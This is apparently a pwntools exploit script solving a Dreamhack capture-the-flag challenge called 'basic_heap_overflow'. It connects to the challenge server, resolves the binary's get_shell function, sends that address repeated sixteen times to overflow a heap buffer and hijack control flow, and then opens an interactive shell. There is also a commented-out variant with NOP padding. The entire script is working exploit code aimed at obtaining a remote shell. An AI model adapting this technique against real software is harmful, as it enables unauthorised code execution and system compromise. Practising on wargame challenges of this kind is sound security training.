from pwn import *
context.log_level = 'debug'

hosts = 'host1.dreamhack.games'
port = 14854

p = remote(hosts,port)

elf = ELF('./basic_heap_overflow')
get_shell = elf.symbols['get_shell']

'''
payload = b'\x90'*0x30
payload += p32(get_shell)
'''

payload = p32(get_shell)*16

p.sendline(payload)

p.interactive()
